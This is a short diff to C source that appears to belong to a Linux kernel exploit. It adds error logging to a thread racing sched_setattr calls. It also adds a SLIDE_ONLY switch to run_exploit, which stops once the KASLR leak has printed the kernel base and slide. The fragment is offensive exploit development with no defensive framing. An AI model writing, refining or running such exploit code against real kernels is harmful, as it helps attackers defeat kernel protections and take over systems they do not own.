@@ -106,8 +106,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         int consumer_nice = PSELECT_CONSUMER_NICE;
         errno = 0;
         long sched_ret = sched_setattr_tid(tid, consumer_nice);
+        int sched_errno = errno;
         if (sched_ret == 0) {
           atomic_fetch_add(&consumer_success, 1);
+        } else {
+          pr_warning("pselect consumer sched_setattr ret=%ld errno=%d tid=%d nice=%d\n",
+                     sched_ret, sched_errno, tid, consumer_nice);
         }
         calls_this_seq++;
         if (calls_this_seq >= CONSUMER_MAX_CALLS) {
@@ -183,6 +187,11 @@ int run_exploit(int argc, char **argv) {
   if (!slide_leak_kernel_base()) {
     pr_error("slide kaslr leak failed\n");
     return 1;
+  }
+  if (getenv("SLIDE_ONLY")) {
+    pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
+               kaslr_base, kaslr_slide, slide_p0_offset);
+    return 0;
   }
 
   pin_to_core(CORE);
